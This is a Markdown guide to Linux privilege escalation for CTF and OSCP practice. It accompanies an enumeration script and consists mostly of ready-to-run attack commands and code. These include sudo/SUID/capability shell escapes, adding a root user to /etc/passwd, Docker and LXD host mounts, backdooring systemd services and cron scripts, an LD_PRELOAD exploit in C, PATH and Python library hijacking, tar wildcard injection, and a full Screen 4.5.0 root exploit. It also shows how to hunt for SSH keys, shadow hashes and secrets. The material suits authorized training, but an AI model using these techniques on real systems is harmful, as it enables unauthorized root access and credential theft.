# Linux Privilege Escalation Guide

## Overview

This guide covers Linux privilege escalation techniques commonly used in CTFs and OSCP exams. The `privesc_linux.sh` script automates the enumeration process and highlights quick wins.

## Quick Reference

### Using the Automation Script

```bash
# Quick wins only (fast)
./privesc_linux.sh -q

# Full enumeration (recommended)
./privesc_linux.sh -f

# Full enumeration with LinPEAS
./privesc_linux.sh -f -l

# Full enumeration with pspy (process monitoring)
./privesc_linux.sh -f -p

# Custom output directory
./privesc_linux.sh -f -o /tmp/privesc_results
```

## Quick Wins Checklist

### 1. Sudo Rights (NOPASSWD)

**What to look for:**
```bash
sudo -l
```

**Exploitable patterns:**
- `(ALL) NOPASSWD: ALL` - Instant root
- `(ALL) NOPASSWD: /bin/bash` - Direct shell
- `(ALL) NOPASSWD: /usr/bin/vim` - GTFOBins escape
- `(ALL) NOPASSWD: /usr/bin/find` - Command execution
- `(ALL) NOPASSWD: /usr/bin/awk` - Code execution

**GTFOBins common binaries:**
- vim, nano, less, more, man
- find, awk, sed, perl, python, ruby
- tar, zip, git, ftp, ssh
- nmap, tcpdump, wireshark
- docker, lxc, lxd

**Exploitation examples:**
```bash
# vim
sudo vim -c ':!/bin/bash'

# find
sudo find . -exec /bin/bash \; -quit

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# python
sudo python -c 'import os; os.system("/bin/bash")'

# tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

**Reference:** https://gtfobins.github.io/

### 2. SUID Binaries

**What to look for:**
```bash
find / -perm -4000 -type f 2>/dev/null
```

**Common exploitable SUID binaries:**
- `/usr/bin/bash` - SUID bash (rare but instant root)
- `/usr/bin/python*` - SUID Python
- `/usr/bin/perl` - SUID Perl
- `/usr/bin/find` - File operations
- `/usr/bin/vim*` - Editor escape
- `/usr/bin/nmap` - Old versions with --interactive
- `/usr/bin/cp` - Copy files as root
- `/usr/bin/mv` - Move files as root
- Custom binaries - Often vulnerable

**Exploitation examples:**

**SUID bash:**
```bash
/usr/bin/bash -p
```

**SUID Python:**
```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**SUID find:**
```bash
/usr/bin/find . -exec /bin/bash -p \; -quit
```

**SUID nmap (old versions):**
```bash
nmap --interactive
!sh
```

**Custom SUID binary analysis:**
```bash
# Check for binary exploitation
strings /usr/local/bin/custom_suid
ltrace /usr/local/bin/custom_suid
strace /usr/local/bin/custom_suid

# Look for:
# - Relative paths (PATH hijacking)
# - system() calls
# - popen() calls
# - Buffer overflows
```

### 3. Capabilities

**What to look for:**
```bash
getcap -r / 2>/dev/null
```

**Dangerous capabilities:**
- `cap_setuid+ep` - Can change UID to root
- `cap_setgid+ep` - Can change GID to root
- `cap_dac_override+ep` - Bypass file permissions
- `cap_dac_read_search+ep` - Read any file
- `cap_sys_admin+ep` - Mount filesystems
- `cap_net_raw+ep` - Network packet manipulation
- `cap_net_admin+ep` - Network configuration

**Exploitation examples:**

**Python with cap_setuid:**
```bash
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Perl with cap_setuid:**
```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

**tar with cap_dac_read_search (read any file):**
```bash
/usr/bin/tar -cvf /tmp/shadow.tar /etc/shadow
tar -xvf /tmp/shadow.tar
cat etc/shadow
```

### 4. Writable /etc/passwd

**Check:**
```bash
ls -la /etc/passwd
```

**If writable, add root user:**
```bash
# Generate password hash
openssl passwd -1 -salt xyz password123
# Result: $1$xyz$...

# Add new root user
echo 'hacker:$1$xyz$...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login
su hacker
```

### 5. Docker/LXD Group Membership

**Check:**
```bash
groups
id
```

**Docker escape:**
```bash
# Mount host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Or if docker socket accessible
docker run -v /:/hostfs -it ubuntu chroot /hostfs bash
```

**LXD escape:**
```bash
# Download Alpine image
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
sudo bash build-alpine

# Import and create container
lxc image import ./alpine*.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

# Access host filesystem
cd /mnt/root/root
```

### 6. Writable Service Files

**Check:**
```bash
find /etc/systemd/system/ -writable 2>/dev/null
find /usr/lib/systemd/system/ -writable 2>/dev/null
```

**If writable, modify ExecStart:**
```bash
# Edit service file
[Service]
ExecStart=/bin/bash -c 'chmod +s /bin/bash'

# Reload and restart
systemctl daemon-reload
systemctl restart vulnerable.service

# Get SUID bash
/bin/bash -p
```

### 7. Cron Jobs with Writable Scripts

**Check:**
```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
```

**If script is writable:**
```bash
# Add reverse shell or SUID bash
echo 'chmod +s /bin/bash' >> /path/to/cron_script.sh

# Wait for cron to execute
# Then use SUID bash
/bin/bash -p
```

## Full Enumeration Techniques

### Kernel Exploits

**Check kernel version:**
```bash
uname -a
cat /proc/version
```

**Common kernel exploits:**
- **DirtyCOW (CVE-2016-5195)** - Kernel 2.6.22 < 3.9, 3.10 < 4.8.3
  - Works on many CTF machines
  - https://github.com/FireFart/dirtycow

- **PwnKit (CVE-2021-4034)** - Polkit < 0.120
  - Very recent, affects many systems
  - https://github.com/arthepsy/CVE-2021-4034

- **Dirty Pipe (CVE-2022-0847)** - Kernel 5.8 - 5.16.11
  - https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits

**Search for exploits:**
```bash
# Use searchsploit
searchsploit linux kernel $(uname -r)

# Or use linux-exploit-suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

### Interesting Files

**Look for:**
```bash
# Database files
find / -name "*.db" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null

# Backup files
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
find / -name "*~" 2>/dev/null

# Configuration files
find / -name "*.conf" 2>/dev/null
find / -name "config*" 2>/dev/null

# Password-related files
find / -name "*password*" 2>/dev/null
find / -name "*passwd*" 2>/dev/null
find / -name "credentials*" 2>/dev/null

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
```

### History Files

**Command history:**
```bash
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.python_history
cat /root/.bash_history  # If readable
```

**Look for:**
- Passwords in commands
- Connection strings
- API keys
- Internal IP addresses
- Usernames

### Environment Variables

**Check for secrets:**
```bash
env
export
set
```

**Common findings:**
- `PASSWORD=...`
- `API_KEY=...`
- `SECRET=...`
- `TOKEN=...`
- Database connection strings

### NFS Shares

**Check NFS exports:**
```bash
cat /etc/exports
showmount -e localhost
```

**If `no_root_squash` is set:**
```bash
# On attacker machine
mkdir /tmp/nfs
mount -t nfs target:/share /tmp/nfs
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash

# On target
/share/bash -p
```

### PATH Hijacking

**If sudo allows environment variables:**
```bash
sudo -l
# Look for: env_keep+=LD_PRELOAD or !env_reset
```

**LD_PRELOAD exploitation:**
```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <allowed_program>
```

**PATH hijacking with relative paths:**
```bash
# If SUID binary uses relative path like "ls"
cd /tmp
cat > ls << EOF
#!/bin/bash
/bin/bash -p
EOF
chmod +x ls
export PATH=/tmp:$PATH
/path/to/suid_binary
```

### Writable Scripts in PATH

```bash
# Find writable directories in PATH
echo $PATH | tr ':' '\n' | while read dir; do
    if [ -w "$dir" ]; then
        echo "[!] Writable: $dir"
    fi
done

# If /usr/local/bin is writable and in PATH
cd /usr/local/bin
cat > sudo << EOF
#!/bin/bash
/bin/bash -p
EOF
chmod +x sudo
# Wait for user to run sudo
```

### Screen/Tmux Sessions

**Check for active sessions:**
```bash
screen -ls
tmux ls

# Attach to session
screen -x <session>
tmux attach -t <session>
```

**Screen 4.5.0 exploit (CVE-2017-5618):**
```bash
# If screen version is vulnerable
cd /tmp
cat > /tmp/libhax.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
}
EOF

gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
cat > /tmp/rootshell.c << EOF
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
/tmp/rootshell
```

## LinPEAS Integration

**Download and run:**
```bash
# Download
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh

# Run with colors
./linpeas.sh -a

# Save output
./linpeas.sh -a > linpeas_output.txt
```

**Key sections to review:**
1. **Quick wins** (highlighted in red/yellow)
2. **Sudo rights**
3. **SUID binaries**
4. **Capabilities**
5. **Writable files**
6. **Cron jobs**
7. **Kernel exploits**

## pspy - Process Monitoring

**Use pspy to monitor processes:**
```bash
# Download
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64

# Run
./pspy64

# Look for:
# - Cron jobs running scripts
# - Scripts running as root
# - Writable scripts being executed
# - Passwords in command lines
```

## Common CTF Patterns

### 1. Custom SUID Binary with PATH Hijacking

**Pattern:** SUID binary calls `ls` or other command without full path

**Exploit:**
```bash
cd /tmp
echo '/bin/bash -p' > ls
chmod +x ls
export PATH=/tmp:$PATH
/path/to/suid_binary
```

### 2. Cron Job with Wildcard Injection

**Pattern:** Cron runs `tar -czf backup.tar.gz *` in a writable directory

**Exploit:**
```bash
cd /writable/directory
echo 'chmod +s /bin/bash' > shell.sh
chmod +x shell.sh
echo "" > --checkpoint=1
echo "" > --checkpoint-action=exec=sh\ shell.sh
# Wait for cron
/bin/bash -p
```

### 3. Docker Socket Accessible

**Pattern:** `/var/run/docker.sock` is accessible

**Exploit:**
```bash
docker run -v /:/hostfs -it alpine chroot /hostfs bash
```

### 4. Python Library Hijacking

**Pattern:** Python script running as root imports from writable directory

**Exploit:**
```bash
# If script imports "module_name"
cd /writable/pythonpath
cat > module_name.py << EOF
import os
os.system('chmod +s /bin/bash')
EOF
# Wait for script to run
/bin/bash -p
```

### 5. Sudo with LD_PRELOAD

**Pattern:** `sudo -l` shows `env_keep+=LD_PRELOAD`

**Exploit:** (See PATH Hijacking section above)

### 6. Readable /etc/shadow

**Pattern:** Shadow file is world-readable

**Exploit:**
```bash
cat /etc/shadow
# Copy hash for user
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Or use hashcat
```

### 7. NFS no_root_squash

**Pattern:** `/etc/exports` shows `no_root_squash`

**Exploit:** (See NFS Shares section above)

## OSCP Exam Tips

1. **Always start with quick wins** - sudo -l, SUID, capabilities
2. **Run LinPEAS** - It catches things you might miss
3. **Check GTFOBins** for every allowed sudo binary
4. **Don't forget capabilities** - Often overlooked
5. **Monitor with pspy** - See what's running as root
6. **Check file permissions** - /etc/passwd, /etc/shadow, cron scripts
7. **Look for custom binaries** - Often vulnerable
8. **Try kernel exploits last** - Can crash the box
9. **Document everything** - Take screenshots of findings
10. **Read the output carefully** - LinPEAS highlights important findings

## Recommended Workflow

```bash
# 1. Quick wins check
./privesc_linux.sh -q

# 2. If no quick wins, run full enumeration
./privesc_linux.sh -f

# 3. Review results in output directory
cd privesc_results_*/
cat QUICK_WINS.txt
cat interesting_finds.txt

# 4. Run LinPEAS if needed
./privesc_linux.sh -l

# 5. Monitor processes with pspy
./privesc_linux.sh -p

# 6. Manual checks for specific findings
sudo -l
find / -perm -4000 2>/dev/null
getcap -r / 2>/dev/null

# 7. Try kernel exploits as last resort
searchsploit linux kernel $(uname -r)
```

## Resources

- **GTFOBins:** https://gtfobins.github.io/
- **PEASS-ng (LinPEAS):** https://github.com/carlospolop/PEASS-ng
- **pspy:** https://github.com/DominicBreuker/pspy
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- **HackTricks:** https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- **Linux Exploit Suggester:** https://github.com/mzet-/linux-exploit-suggester

## Common Mistakes to Avoid

1. **Not checking sudo -l first** - Always your first command
2. **Missing capabilities** - Run getcap
3. **Not monitoring processes** - Use pspy
4. **Overlooking custom binaries** - They're often vulnerable
5. **Not checking file permissions** - Look for writable configs
6. **Forgetting about docker/lxd groups** - Easy privilege escalation
7. **Not reading LinPEAS output carefully** - It highlights findings
8. **Trying kernel exploits too early** - Can crash the system
9. **Not checking cron jobs** - Look at /etc/crontab
10. **Missing environment variables** - Check env and sudo -l

## Quick Reference Commands

```bash
# Quick wins
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
ls -la /etc/passwd /etc/shadow
groups

# Full enumeration
uname -a
cat /etc/crontab
cat /etc/exports
env
history
find / -writable -type f 2>/dev/null | grep -v proc
ps aux | grep root

# Automated tools
./privesc_linux.sh -f -l
./linpeas.sh -a
./pspy64
```
